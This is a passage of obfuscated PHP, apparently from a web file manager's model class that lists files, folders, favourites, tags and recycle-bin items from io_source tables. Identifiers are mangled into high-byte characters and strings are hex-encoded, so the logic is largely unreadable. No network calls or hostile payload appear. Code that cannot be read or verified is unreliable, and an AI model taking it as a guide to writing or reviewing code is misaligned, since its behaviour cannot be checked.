$Ê–‘™‰ª[4] . $¬¾âÒË¼); $©áÊäñ× = self::textEncode($©áÊäñ×); $å”í­ÎÔ = array($Ê–‘™‰ª[33] => $ÑÕ¿ ©÷, $Ê–‘™‰ª[107] => $ÁŸÍ¡Î¶, $Ê–‘™‰ª[462] => $©áÊäñ×); $ä®÷í©[] = $this->filterWhere($å”í­ÎÔ); } if (!$ä®÷í©) { return !0; } $ìÖÁğŠù = $this->cacheKey($Ê–‘™‰ª[487]); CacheLock::lock($ìÖÁğŠù); $³‡ª¶ƒ£ = $this->addAll($ä®÷í©, array(), !0); CacheLock::unlock($ìÖÁğŠù); return $³‡ª¶ƒ£; } protected function optionDefault($èŸÅô–ú = '') { return !1; } public function setDeep($¼ÀïÕªû, $‡ƒáÀ…Ù = false, $‡–¯Ë‰¼ = '') { $¦‚‚±è = explode($_SERVER[¼èá¯æÙ][10], $¼ÀïÕªû); $£é†Ùúƒ = $this->get(); array_set_value($£é†Ùúƒ, $¼ÀïÕªû, $‡ƒáÀ…Ù); $this->set($¦‚‚±è[0], $£é†Ùúƒ[$¦‚‚±è[0]], $‡–¯Ë‰¼); } public function remove($ŒóĞÙÂò, $õúëıÎÀ = '') { $ƒ©‘Ş­Ê =& $_SERVER[¼èá¯æÙ]; $this->cacheRemove($õúëıÎÀ); $ö¡Èñ×Ú = $this->filterWhere(array($ƒ©‘Ş­Ê[107] => $ŒóĞÙÂò, $ƒ©‘Ş­Ê[33] => $õúëıÎÀ)); if (is_null($ŒóĞÙÂò)) { unset($ö¡Èñ×Ú[$ƒ©‘Ş­Ê[107]]); } return $this->where($ö¡Èñ×Ú)->delete(); } public function cacheSet($ôÉó¸¬ß, $şÍŒ•¶ = false) { return Cache::set($this->cacheKey($ôÉó¸¬ß), $şÍŒ•¶); } public function cacheGet($²ÃÅ¸æ) { return Cache::get($this->cacheKey($²ÃÅ¸æ)); } public function cacheRemove($È‘óÉÎ±) { return Cache::remove($this->cacheKey($È‘óÉÎ±)); } protected function filterWhere($öÆâœ) { return $öÆâœ; } protected function cacheKey($ØÎïÍÙ¶) { return $ØÎïÍÙ¶; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\143\x65"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\x6d\x65" => "\151\x6f\x5f\163\x6f\165\x72\143\145\x5f\x6d\x65\x74\141", "\x6d\145\164\141\x46\151\x65\154\144" => "\x73\x6f\x75\x72\x63\x65\111\104"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\x54\x69\x6d\145", "\x74\x69\155\145", "\151\x6e\163\x65\162\x74", "\x66\165\x6e\143\164\x69\157\x6e"), array("\x63\x72\145\141\x74\145\x54\x69\155\145", "\x74\x69\155\145", "\x69\x6e\163\x65\x72\x74", "\146\165\156\143\164\151\157\156"), array("\166\151\x65\x77\124\151\x6d\x65", "\x74\151\155\x65", "\151\156\163\x65\x72\164", "\x66\165\x6e\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($³‘ÂêÒä) { return $this->listSource(array($_SERVER[¼èá¯æÙ][488] => $³‘ÂêÒä)); } public function typeName($„Åş™’²) { static $ÙÈö½ø = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\145\x6d", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\162\157\165\x70"); return $ÙÈö½ø[$„Åş™’² . $_SERVER[¼èá¯æÙ][12]]; } public function sourceListInfo($ş“¦Ó®ß, $¹¬äĞú¶ = false) { $÷øº¨ =& $_SERVER[¼èá¯æÙ]; $ş“¦Ó®ß = $ş“¦Ó®ß ? $ş“¦Ó®ß : array(); $ş“¦Ó®ß = array_filter(array_unique($ş“¦Ó®ß)); if (!$ş“¦Ó®ß) { return array(); } $È†œ¨àÀ = $this->where(array($÷øº¨[203] => array($÷øº¨[7], $ş“¦Ó®ß)))->select(); $this->_listDataApply($È†œ¨àÀ, $¹¬äĞú¶); return array_to_keyvalue($È†œ¨àÀ, $÷øº¨[203]); } public function pathInfoFilter(&$©íÆàóĞ) { $¼ºÓÜêÃ =& $_SERVER[¼èá¯æÙ]; static $†ıŞıªÄ = false; static $†‚…´­ğ = false; static $Ç‰‘±—› = false; if (!$†ıŞıªÄ) { $€ÄÉı´± = $¼ºÓÜêÃ[489]; $€ÄÉı´± .= $¼ºÓÜêÃ[490]; $€ÄÉı´± .= $¼ºÓÜêÃ[491]; $ŒÒÄÅÄ” = $¼ºÓÜêÃ[492]; $˜ºƒ»²× = explode($¼ºÓÜêÃ[50], $ŒÒÄÅÄ”); $†ıŞıªÄ = explode($¼ºÓÜêÃ[50], $€ÄÉı´±); $†‚…´­ğ = array(); foreach ($†ıŞıªÄ as $¥¡Ğ¡Ğş) { if (in_array($¥¡Ğ¡Ğş, $˜ºƒ»²×)) { continue; } $†‚…´­ğ[] = $¥¡Ğ¡Ğş; } $Ç‰‘±—› = explode($¼ºÓÜêÃ[50], $¼ºÓÜêÃ[493]); } foreach ($Ç‰‘±—› as $…°Ã„Õà) { if (isset($©íÆàóĞ[$…°Ã„Õà])) { $©íÆàóĞ[$…°Ã„Õà] = intval($©íÆàóĞ[$…°Ã„Õà]); } } $©íÆàóĞ[$¼ºÓÜêÃ[97]] = $¼ºÓÜêÃ[494] . $©íÆàóĞ[$¼ºÓÜêÃ[203]] . $¼ºÓÜêÃ[495]; $©íÆàóĞ[$¼ºÓÜêÃ[33]] = $©íÆàóĞ[$¼ºÓÜêÃ[496]] == 1 ? $¼ºÓÜêÃ[88] : $¼ºÓÜêÃ[242]; $©íÆàóĞ[$¼ºÓÜêÃ[200]] = $this->typeName($©íÆàóĞ[$¼ºÓÜêÃ[200]]); if ($©íÆàóĞ[$¼ºÓÜêÃ[496]] != 1) { $©íÆàóĞ[$¼ºÓÜêÃ[179]] = $©íÆàóĞ[$¼ºÓÜêÃ[497]]; unset($©íÆàóĞ[$¼ºÓÜêÃ[497]]); } $¦Üíœ•Ø = $†ıŞıªÄ; if (isset($©íÆàóĞ[$¼ºÓÜêÃ[498]]) && $©íÆàóĞ[$¼ºÓÜêÃ[498]][$¼ºÓÜêÃ[499]] == -1) { $¦Üíœ•Ø = $†‚…´­ğ; } $©íÆàóĞ = array_field_key($©íÆàóĞ, $¦Üíœ•Ø); return $©íÆàóĞ; } public function listUserFav() { $îÅñÊ² =& $_SERVER[¼èá¯æÙ]; $À›ôÀ­Õ = Model($îÅñÊ²[500])->listData(); $ºÄ½÷Û€ = array_filter_by_field($À›ôÀ­Õ, $îÅñÊ²[33], $îÅñÊ²[501]); $ºÄ½÷Û€ = array_to_keyvalue($ºÄ½÷Û€, $îÅñÊ²[12], $îÅñÊ²[97]); if ($ºÄ½÷Û€) { $ÆçŠí = $this->listSource(array($îÅñÊ²[502] => array($îÅñÊ²[503], $ºÄ½÷Û€))); } $ÆçŠí = array_to_keyvalue($ÆçŠí[$îÅñÊ²[457]], $îÅñÊ²[203]); foreach ($À›ôÀ­Õ as &$À¡õºÕ) { $À¡õºÕ = array($îÅñÊ²[504] => $À¡õºÕ[$îÅñÊ²[486]], $îÅñÊ²[505] => $À¡õºÕ[$îÅñÊ²[32]], $îÅñÊ²[506] => $À¡õºÕ[$îÅñÊ²[97]], $îÅñÊ²[507] => $À¡õºÕ[$îÅñÊ²[33]], $îÅñÊ²[508] => $À¡õºÕ[$îÅñÊ²[243]], $îÅñÊ²[509] => $À¡õºÕ[$îÅñÊ²[98]]); if ($À¡õºÕ[$îÅñÊ²[33]] == $îÅñÊ²[501] && $ÆçŠí[$À¡õºÕ[$îÅñÊ²[97]]]) { $À¡õºÕ[$îÅñÊ²[100]] = $ÆçŠí[$À¡õºÕ[$îÅñÊ²[97]]]; } } unset($À¡õºÕ); return $À›ôÀ­Õ; } public function listUserTag($ÕœÚâú™) { $Ó…ÎÊÚ‚ =& $_SERVER[¼èá¯æÙ]; if ($ÕœÚâú™ && !is_array($ÕœÚâú™)) { $ÕœÚâú™ = array($ÕœÚâú™); } $–ß¼Šì = Model($Ó…ÎÊÚ‚[510])->listData(); $š¢½øõñ = array(); $øÉ ú¾ = array(); foreach ($–ß¼Šì as $éà×âÇó) { $¨¿£—£ = $éà×âÇó[$Ó…ÎÊÚ‚[97]]; if (!$¨¿£—£) { continue; } if (!isset($øÉ ú¾[$¨¿£—£])) { $øÉ ú¾[$¨¿£—£] = array(); } $øÉ ú¾[$¨¿£—£][] = $éà×âÇó[$Ó…ÎÊÚ‚[511]]; $š¢½øõñ[$éà×âÇó[$Ó…ÎÊÚ‚[97]]] = $éà×âÇó; } $Î’Ğ¥¿ú = array(); $˜öøíÉŠ = array(); $¶£Ê¦ªø = array(); foreach ($øÉ ú¾ as $‚…“Á => $ú‚…í¨) { $„äğ­ÆÃ = !0; if (!$ÕœÚâú™) { $Î’Ğ¥¿ú[] = $‚…“Á; continue; } foreach ($ÕœÚâú™ as $ß Šªˆ) { if (!in_array($ß Šªˆ, $ú‚…í¨)) { $„äğ­ÆÃ = !1; break; } } if (!$„äğ­ÆÃ) { continue; } if (!is_numeric($‚…“Á)) { $‰¥óâõ = $š¢½øõñ[$‚…“Á]; $Ü€‘Ìõ¿ = array($Ó…ÎÊÚ‚[32] => $‰¥óâõ[$Ó…ÎÊÚ‚[32]], $Ó…ÎÊÚ‚[97] => $‰¥óâõ[$Ó…ÎÊÚ‚[97]], $Ó…ÎÊÚ‚[33] => $‰¥óâõ[$Ó…ÎÊÚ‚[33]], $Ó…ÎÊÚ‚[100] => array($Ó…ÎÊÚ‚[512] => 1), $Ó…ÎÊÚ‚[244] => !0); if ($‰¥óâõ[$Ó…ÎÊÚ‚[33]] == $Ó…ÎÊÚ‚[242]) { $¶£Ê¦ªø[] = $Ü€‘Ìõ¿; } if ($‰¥óâõ[$Ó…ÎÊÚ‚[33]] == $Ó…ÎÊÚ‚[88]) { $˜öøíÉŠ[] = $Ü€‘Ìõ¿; } continue; } $Î’Ğ¥¿ú[] = $‚…“Á; } if ($Î’Ğ¥¿ú) { $¨ÄĞï = $this->listSource(array($Ó…ÎÊÚ‚[502] => array($Ó…ÎÊÚ‚[503], $Î’Ğ¥¿ú))); } $¨ÄĞï = $¨ÄĞï ? $¨ÄĞï : array($Ó…ÎÊÚ‚[95] => array(), $Ó…ÎÊÚ‚[96] => array()); $¨ÄĞï[$Ó…ÎÊÚ‚[95]] = array_merge($¨ÄĞï[$Ó…ÎÊÚ‚[95]], $˜öøíÉŠ); $¨ÄĞï[$Ó…ÎÊÚ‚[96]] = array_merge($¨ÄĞï[$Ó…ÎÊÚ‚[96]], $¶£Ê¦ªø); if (isset($¨ÄĞï[$Ó…ÎÊÚ‚[454]]) && count($Î’Ğ¥¿ú) == $¨ÄĞï[$Ó…ÎÊÚ‚[454]][$Ó…ÎÊÚ‚[455]]) { return $¨ÄĞï; } $²ê¾¹„ª = array(); $¡¯½ÓÃ† = array_to_keyvalue($¨ÄĞï[$Ó…ÎÊÚ‚[95]], $Ó…ÎÊÚ‚[12], $Ó…ÎÊÚ‚[203]); $Í¶ò•É© = array_to_keyvalue($¨ÄĞï[$Ó…ÎÊÚ‚[96]], $Ó…ÎÊÚ‚[12], $Ó…ÎÊÚ‚[203]); $ÖÔº«è¢ = array_merge($Í¶ò•É©, $¡¯½ÓÃ†); foreach ($Î’Ğ¥¿ú as $¨¿£—£) { if (!in_array($¨¿£—£, $ÖÔº«è¢)) { $²ê¾¹„ª[] = $¨¿£—£; } } if ($²ê¾¹„ª) { Model($Ó…ÎÊÚ‚[513])->removeBySource($²ê¾¹„ª); } return $¨ÄĞï; } public function listUserRecycle() { $Éµ«Æá =& $_SERVER[¼èá¯æÙ]; $¹§ª©Û€ = Model($Éµ«Æá[514])->listData(); if (!$¹§ª©Û€) { return array(); } $Õ¶¥ÜÎ = array($Éµ«Æá[502] => array($Éµ«Æá[503], $¹§ª©Û€), $Éµ«Æá[515] => 1); return $this->listSource($Õ¶¥ÜÎ); } public function listSource($‰Ïß±÷, $†³†» = 3000, $¥È—ˆ±Ê = false) { $üŞèóâ =& $_SERVER[¼èá¯æÙ]; if (!isset($‰Ïß±÷[$üŞèóâ[516]])) { $‰Ïß±÷[$üŞèóâ[516]] = 0; } if (isset($‰Ïß±÷[$üŞèóâ[202]]) && $‰Ïß±÷[$üŞèóâ[202]] == $üŞèóâ[240]) { $‰Ïß±÷[$üŞèóâ[497]] = array($üŞèóâ[517], $üŞèóâ[12]); } $¥ÕÄé¸ = $üŞèóâ[518]; $€È…Š = $this->field($¥ÕÄé¸)->_makeOrder()->where($‰Ïß±÷)->selectPage($†³†»); $this->_listPageCheck($€È…Š, $¥ÕÄé¸, $‰Ïß±÷); $this->_listDataApply($€È…Š[$üŞèóâ[457]], $¥È—ˆ±Ê); $this->_listMake($€È…Š); return $€È…Š; } private function _listPageCheck(&$úÂáºÀÄ, $ø®œÑÜ, $ëª­ÌÅ) { $àĞÛ±×ø =& $_SERVER[¼èá¯æÙ]; if (!is_array($úÂáºÀÄ[$àĞÛ±×ø[454]])) { return; } $©Úü¶—© = $úÂáºÀÄ[$àĞÛ±×ø[454]]; if ($©Úü¶—©[$àĞÛ±×ø[456]] <= 1) { return; } if ($©Úü¶—©[$àĞÛ±×ø[455]] >= 100000) { return; } if (Model($àĞÛ±×ø[519])->get($àĞÛ±×ø[520]) != $àĞÛ±×ø[521]) { return; } $ø®œÑÜ = str_replace(array($àĞÛ±×ø[53], $àĞÛ±×ø[429], $àĞÛ±×ø[59]), $àĞÛ±×ø[12], $ø®œÑÜ); $ø®œÑÜ = $àĞÛ±×ø[522] . str_replace($àĞÛ±×ø[50], $àĞÛ±×ø[523], $ø®œÑÜ) . $àĞÛ±×ø[524]; $—Ãºş“È = $àĞÛ±×ø[525]; $—Ãºş“È = $—Ãºş“È . $àĞÛ±×ø[526]; $‘áüËı¡ = $©Úü¶—©[$àĞÛ±×ø[451]] * ($©Úü¶—©[$àĞÛ±×ø[440]] - 1) . $àĞÛ±×ø[50] . $©Úü¶—©[$àĞÛ±×ø[451]]; $’¯îŞğ– = $this->_makeOrder(!0); $Ü½ñŸ·Í = $àĞÛ±×ø[522] . str_replace($àĞÛ±×ø[50], $àĞÛ±×ø[523], $’¯îŞğ–[0]); if (strpos($Ü½ñŸ·Í, $àĞÛ±×ø[527])) { $Ü½ñŸ·Í = str_replace($àĞÛ±×ø[527], $àĞÛ±×ø[528], $Ü½ñŸ·Í); } else { $Ü½ñŸ·Í .= $àĞÛ±×ø[529] . $’¯îŞğ–[1]; } $À£¸½Û€ = array(); foreach ($ëª­ÌÅ as $¾ÈÆ‘çÎ => $ıéÜ™ìŞ) { $À£¸½Û€[$àĞÛ±×ø[522] . $¾ÈÆ‘çÎ] = $ıéÜ™ìŞ; } $this->alias($àĞÛ±×ø[530])->field($ø®œÑÜ)->limit($‘áüËı¡)->order($Ü½ñŸ·Í); $Ô½ÌÕ° = $this->join($—Ãºş“È)->where($À£¸½Û€)->select(); if ($Ô½ÌÕ°) { $úÂáºÀÄ[$àĞÛ±×ø[457]] = $Ô½ÌÕ°; } } protected function _makeOrder($ËÒôæå = false) { $Í¢Š´†é =& $_SERVER[¼èá¯æÙ]; $„í÷¶«¿ = Model($Í¢Š´†é[531])->get($Í¢Š´†é[532]); $Û“§Ñ• = Model($Í¢Š´†é[531])->get($Í¢Š´†é[533]); $”•à§¾ó = array($Í¢Š´†é[534] => $Í¢Š´†é[535], $Í¢Š´†é[536] => $Í¢Š´†é[537]); $£Ê·¼ï· = array($Í¢Š´†é[32] => $Í¢Š´†é[32], $Í¢Š´†é[89] => $Í¢Š´†é[89], $Í¢Š´†é[179] => $Í¢Š´†é[497], $Í¢Š´†é[538] => $Í¢Š´†é[538], $Í¢Š´†é[539] => $Í¢Š´†é[540], $Í¢Š´†é[243] => $Í¢Š´†é[243], $Í¢Š´†é[98] => $Í¢Š´†é[98]); $÷ƒ§¿…³ = Input::get($Í¢Š´†é[541], $Í¢Š´†é[7], $„í÷¶«¿, array_keys($£Ê·¼ï·)); $Å­æÕÏ = Input::get($Í¢Š´†é[542], $Í¢Š´†é[7], $Û“§Ñ•, array_keys($”•à§¾ó)); if (!in_array($÷ƒ§¿…³, array_keys($£Ê·¼ï·))) { $÷ƒ§¿…³ = $Í¢Š´†é[32]; } if (!in_array($Å­æÕÏ, array_keys($”•à§¾ó))) { $÷ƒ§¿…³ = $Í¢Š´†é[534]; } if ($÷ƒ§¿…³ == $Í¢Š´†é[32]) { } $ŒÚŸÁĞ» = $Í¢Š´†é[543] . $£Ê·¼ï·[$÷ƒ§¿…³] . $Í¢Š´†é[53] . $”•à§¾ó[$Å­æÕÏ]; $ŒÚŸÁĞ» = rtrim(trim($ŒÚŸÁĞ»), $Í¢Š´†é[50]); if ($ËÒôæå) { return array($ŒÚŸÁĞ», $”•à§¾ó[$Å­æÕÏ]); } return $this->order($ŒÚŸÁĞ»); } protected function _listDataApplyItem($¿Ö†Şø, $ÌšùŞ = false) { $Ûˆ›ğ¸’ = array($¿Ö†Şø); $this->_listDataApply($Ûˆ›ğ¸’, $ÌšùŞ); return $Ûˆ›ğ¸’[0]; } protected function _listDataApply(&$Ñ¼¸Ìì, $âóì¼Şå = false) { $†èè¡ğ =& $_SERVER[¼èá¯æÙ]; if (!$Ñ¼¸Ìì) { $Ñ¼¸Ìì = array(); return; } $Ç°±¿ı† = array_to_keyvalue($Ñ¼¸Ìì, $†èè¡ğ[12], $†èè¡ğ[203]); $Ç°±¿ı† = array_unique($Ç°±¿ı†); $this->_listSourceCache($Ñ¼¸Ìì); if (!$âóì¼Şå) { $this->_listAppendMeta($Ñ¼¸Ìì, $Ç°±¿ı†); $this->_listAppendFileMeta($Ñ¼¸Ìì, $Ç°±¿ı†); $this->_listAppendChildren($Ñ¼¸Ìì, $Ç°±¿ı†); } $this->_listAppendPath($Ñ¼¸Ìì); $this->_listAppendAuth($Ñ¼¸Ìì); $this->_listAppendSourceInfo($Ñ¼¸Ìì, $Ç°±¿ı†); $this->_listAppendUser($Ñ¼¸Ìì); $this->_listFilterInfo($Ñ¼¸Ìì, $âóì¼Şå); $this->_listAppendAuthSecret($Ñ¼¸Ìì); } protected function _listSourceCache($Ê×ç¥) { $Ïœœ€‰ì =& $_SERVER[¼èá¯æÙ]; foreach ($Ê×ç¥ as $°“òÕú) { self::$cacheSourceInfo[$Ïœœ€‰ì[544] . $°“òÕú[$Ïœœ€‰ì[203]]] = $°“òÕú; } } protected function _listFilterInfo(&$Ï¶éÖüÓ, $â³¿şçØ = false) { $Å©»²Å£ =& $_SERVER[¼èá¯æÙ]; foreach ($Ï¶éÖüÓ as &$í÷òÉ²Ó) { $í÷òÉ²Ó = $this->pathInfoFilter($í÷òÉ²Ó); self::$cachePathInfo[$Å©»²Å£[545] . intval($â³¿şçØ) . $Å©»²Å£[473] . $í÷òÉ²Ó[$Å©»²Å£[203]]] = $í÷òÉ²Ó; } unset($í÷òÉ²Ó); } protected function _listMake(&$å¥ãè®¿) { $Ã£¹»Š± =& $_SERVER[¼èá¯æÙ]; $å¥ãè®¿[$Ã£¹»Š±[95]] = array(); $å¥ãè®¿[$Ã£¹»Š±[96]] = array(); foreach ($å¥ãè®¿[$Ã£¹»Š±[457]] as $®ñº…â©) { $·ºË•‡ = $®ñº…â©[$Ã£¹»Š±[496]] == 1 ? $Ã£¹»Š±[95] : $Ã£¹»Š±[96]; $å¥ãè®¿[$·ºË•‡][] = $®ñº…â©; } unset($å¥ãè®¿[$Ã£¹»Š±[457]]); } protected function _listAppendMeta(&$ŒîÒÑ«, $¾Æ÷×Ù›) { $çûÎ¿å¼ =& $_SERVER[¼èá¯æÙ]; $…µË»ñ = array($çûÎ¿å¼[502] => array($çûÎ¿å¼[503], $¾Æ÷×Ù›)); $Ô«Ú¼Úı = Model($çûÎ¿å¼[546])->field($çûÎ¿å¼[547])->where($…µË»ñ)->select(); if (!$Ô«Ú¼Úı) { return; } $Íˆ÷‚¸É = array($çûÎ¿å¼[548], $çûÎ¿å¼[549], $çûÎ¿å¼[528]); $³™ôÕó• = array(); foreach ($Ô«Ú¼Úı as $ò™şÑ“) { if (!isset($³™ôÕó•[$ò™şÑ“[$çûÎ¿å¼[203]]])) { $³™ôÕó•[$ò™şÑ“[$çûÎ¿å¼[203]]] = array(); } if (in_array($ò™şÑ“[$çûÎ¿å¼[107]], $Íˆ÷‚¸É)) { continue; } $³™ôÕó•[$ò™şÑ“[$çûÎ¿å¼[203]]][$ò™şÑ“[$çûÎ¿å¼[107]]] = $ò™şÑ“[$çûÎ¿å¼[462]]; } foreach ($ŒîÒÑ« as &$Â±ş×û) { $Â±ş×û[$çûÎ¿å¼[550]] = !1; if (isset($³™ôÕó•[$Â±ş×û[$çûÎ¿å¼[203]]])) { $Â±ş×û[$çûÎ¿å¼[550]] = $³™ôÕó•[$Â±ş×û[$çûÎ¿å¼[203]]]; } if ($this->fileIsLock($Â±ş×û) && $Â±ş×û[$çûÎ¿å¼[498]]) { $Ç×ÀÕöè = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Â±ş×û[$çûÎ¿å¼[498]][$çûÎ¿å¼[499]] = AuthModel::authDisable($Â±ş×û[$çûÎ¿å¼[498]][$çûÎ¿å¼[499]], $Ç×ÀÕöè); $Â±ş×û[$çûÎ¿å¼[498]][$çûÎ¿å¼[551]][$çûÎ¿å¼[498]] = $Â±ş×û[$çûÎ¿å¼[498]][$çûÎ¿å¼[499]]; } } unset($Â±ş×û); } protected function _listAppendFileMeta(&$ÅËÙÛ©ø, $õ¨õ—¢ù) { $êí«­ˆî =& $_SERVER[¼èá¯æÙ]; $ã«Îı¸ = array_to_keyvalue($ÅËÙÛ©ø, $êí«­ˆî[12], $êí«­ˆî[552]); $ã«Îı¸ = array_filter(array_unique($ã«Îı¸)); if (!$ã«Îı¸) { return; } $Ô–÷ßø£ = array($êí«­ˆî[553] => array($êí«­ˆî[503], $ã«Îı¸)); $ªÅë½áÉ = $êí«­ˆî[554]; $¦¨ˆè— = Model($êí«­ˆî[555])->field($ªÅë½áÉ)->where($Ô–÷ßø£)->select(); $¦¨ˆè— = array_to_keyvalue($¦¨ˆè—, $êí«­ˆî[552]); $ËÜøğ¼ = Model($êí«­ˆî[556])->field($êí«­ˆî[557])->where($Ô–÷ßø£)->select(); $ËÜøğ¼ = $ËÜøğ¼ ? $ËÜøğ¼ : array(); $õ³Ä¿ = array(); foreach ($ËÜøğ¼ as $½Èï¦Ò¹) { if (!isset($õ³Ä¿[$½Èï¦Ò¹[$êí«­ˆî[552]]])) { $õ³Ä¿[$½Èï¦Ò¹[$êí«­ˆî[552]]] = array(); } $õ³Ä¿[$½Èï¦Ò¹[$êí«­ˆî[552]]][$½Èï¦Ò¹[$êí«­ˆî[107]]] = $½Èï¦Ò¹[$êí«­ˆî[462]]; } foreach ($ÅËÙÛ©ø as &$÷úı’ÉÚ) { $„°¨ûù = $÷úı’ÉÚ[$êí«­ˆî[552]]; if (!$„°¨ûù || !is_array($¦¨ˆè—[$„°¨ûù])) { continue; } $Íé÷ä¬î = $¦¨ˆè—[$„°¨ûù]; $Íé÷ä¬î[$êí«­ˆî[89]] = $÷úı’ÉÚ[$êí«­ˆî[89]]; $Íé÷ä¬î[$êí«­ˆî[32]] = $÷úı’ÉÚ[$êí«­ˆî[32]]; if (!$Íé÷ä¬î[$êí«­ˆî[558]]) { Model($êí«­ˆî[555])->fileMd5Check($Íé÷ä¬î); } if (!isset(self::$cacheFileInfo[$êí«­ˆî[559] . $„°¨ûù])) { self::$cacheFileInfo[$êí«­ˆî[559] . $„°¨ûù] = array_merge(array(), $Íé÷ä¬î); } unset($¦¨ˆè—[$„°¨ûù][$êí«­ˆî[97]]); $‰äˆûÒ½ = isset($õ³Ä¿[$„°¨ûù]) && is_array($õ³Ä¿[$„°¨ûù]) ? $õ³Ä¿[$„°¨ûù] : array(); $÷úı’ÉÚ[$êí«­ˆî[180]] = array_merge($‰äˆûÒ½, $¦¨ˆè—[$„°¨ûù]); if (isset($÷úı’ÉÚ[$êí«­ˆî[180]][$êí«­ˆî[194]])) { $÷úı’ÉÚ[$êí«­ˆî[194]] = json_decode($÷úı’ÉÚ[$êí«­ˆî[180]][$êí«­ˆî[194]], !0); unset($÷úı’ÉÚ[$êí«­ˆî[180]][$êí«­ˆî[194]]); } } unset($÷úı’ÉÚ); } protected function _listAppendSourceInfo(&$‰…ÏĞ¡œ, $ÎãŸŒ§) { $±¿¼ƒ£ =& $_SERVER[¼èá¯æÙ]; $†‘­†Ìõ = Model($±¿¼ƒ£[560])->listData(); $Ú”Ë¯ÔÔ = Model($±¿¼ƒ£[510])->listData(); $‹™æŞø× = Model($±¿¼ƒ£[500])->listData(); $£ßÑÎù = Model($±¿¼ƒ£[561])->listSimple(); $öõÏ±¸¬ = array_to_keyvalue($†‘­†Ìõ, $±¿¼ƒ£[486]); $ñ¬½Í¥â = array_to_keyvalue_group($Ú”Ë¯ÔÔ, $±¿¼ƒ£[97], $±¿¼ƒ£[511]); $´Šäæ« = array_to_keyvalue($‹™æŞø×, $±¿¼ƒ£[97]); $Š‡äŞÍÀ = array_to_keyvalue_group($£ßÑÎù, $±¿¼ƒ£[203]); foreach ($‰…ÏĞ¡œ as &$ãşğ˜»”) { $ãşğ˜»”[$±¿¼ƒ£[100]] = array($±¿¼ƒ£[562] => 0, $±¿¼ƒ£[563] => 0, $±¿¼ƒ£[564] => 0); if (isset($´Šäæ«[$ãşğ˜»”[$±¿¼ƒ£[203]]])) { $ãşğ˜»”[$±¿¼ƒ£[100]][$±¿¼ƒ£[565]] = 1; $ãşğ˜»”[$±¿¼ƒ£[100]][$±¿¼ƒ£[566]] = $´Šäæ«[$ãşğ˜»”[$±¿¼ƒ£[203]]][$±¿¼ƒ£[32]]; } if ($ñ¬½Í¥â && $öõÏ±¸¬ && isset($ñ¬½Í¥â[$ãşğ˜»”[$±¿¼ƒ£[203]]])) { $ãşğ˜»”[$±¿¼ƒ£[100]][$±¿¼ƒ£[567]] = array(); foreach ($ñ¬½Í¥â[$ãşğ˜»”[$±¿¼ƒ£[203]]] as $”¦ƒö°) { $îœî„ŠÖ = $öõÏ±¸¬[$”¦ƒö°]; $ãşğ˜»”[$±¿¼ƒ£[100]][$±¿¼ƒ£[567]][] = array($±¿¼ƒ£[568] => $îœî„ŠÖ[$±¿¼ƒ£[486]], $±¿¼ƒ£[505] => $îœî„ŠÖ[$±¿¼ƒ£[32]], $±¿¼ƒ£[569] => $îœî„ŠÖ[$±¿¼ƒ£[570]]); } } if ($Š‡äŞÍÀ && isset($Š‡äŞÍÀ[$ãşğ˜»”[$±¿¼ƒ£[203]]])) { $ãşğ˜»”[$±¿¼ƒ£[100]][$±¿¼ƒ£[571]] = array(); foreach ($Š‡äŞÍÀ[$ãşğ˜»”[$±¿¼ƒ£[203]]] as $åø´¼µ²) { $‡ÆŞ°Ì• = $±¿¼ƒ£[572]; if ($åø´¼µ²[$±¿¼ƒ£[573]] == $±¿¼ƒ£[101]) { $‡ÆŞ°Ì• .= $±¿¼ƒ£[574]; } $ãşğ˜»”[$±¿¼ƒ£[100]][$±¿¼ƒ£[571]] = array_field_key($åø´¼µ², explode($±¿¼ƒ£[50], $‡ÆŞ°Ì•)); } } } unset($ãşğ˜»”); return $‰…ÏĞ¡œ; } protected function _listAppendChildren(&$ì‹ôöÇŠ, $Â·“§Š) { $ñãøàğ =& $_SERVER[¼èá¯æÙ]; $÷ßºåÈı = array(); $›æ½ÕĞÛ = array($ñãøàğ[251] => 0, $ñãøàğ[252] => 0); foreach ($ì‹ôöÇŠ as &$Šû¸ö™²) { if (!$Šû¸ö™²[$ñãøàğ[496]]) { continue; } $÷ßºåÈı[] = $Šû¸ö™²[$ñãøàğ[203]]; } unset($Šû¸ö™²); if (!$÷ßºåÈı) { return; } $¤œÅú«é = array($ñãøàğ[202] => array($ñãøàğ[7], $÷ßºåÈı), $ñãøàğ[516] => 0); $Ü‰Òğ‡ú = array($ñãøàğ[202], $ñãøàğ[496], $ñãøàğ[575] => $ñãøàğ[576]); $ôüŒ•ãç = $this->field($Ü‰Òğ‡ú)->where($¤œÅú«é)->group($ñãøàğ[577])->select(); $èâ–­Øô = array(); foreach ($ôüŒ•ãç as $·ÜËÆ”ş) { $ÚÈø‹¸è = $·ÜËÆ”ş[$ñãøàğ[202]]; $‘ÆŸø° = $·ÜËÆ”ş[$ñãøàğ[496]] == $ñãøàğ[101] ? $ñãøàğ[252] : $ñãøàğ[251]; if (!isset($èâ–­Øô[$ÚÈø‹¸è])) { $èâ–­Øô[$ÚÈø‹¸è] = array($ñãøàğ[251] => 0, $ñãøàğ[252] => 0); } $èâ–­Øô[$ÚÈø‹¸è][$‘ÆŸø°] += $·ÜËÆ”ş[$ñãøàğ[576]]; } foreach ($ì‹ôöÇŠ as &$Šû¸ö™²) { if (!$Šû¸ö™²[$ñãøàğ[496]]) { continue; } $ÒİÎ¶ñ = is_array($èâ–­Øô[$Šû¸ö™²[$ñãøàğ[203]]]) ? $èâ–­Øô[$Šû¸ö™²[$ñãøàğ[203]]] : $›æ½ÕĞÛ; $Šû¸ö™²[$ñãøàğ[252]] = $ÒİÎ¶ñ[$ñãøàğ[252]]; $Šû¸ö™²[$ñãøàğ[251]] = $ÒİÎ¶ñ[$ñãøàğ[251]]; unset($Šû¸ö™²[$ñãøàğ[497]]); } unset($Šû¸ö™²); } protected function _listAppendAuth(&$›ÄõÓÄ) { $Îò¹áì =& $_SERVER[¼èá¯æÙ]; $ÌÒ¨áô˜ = 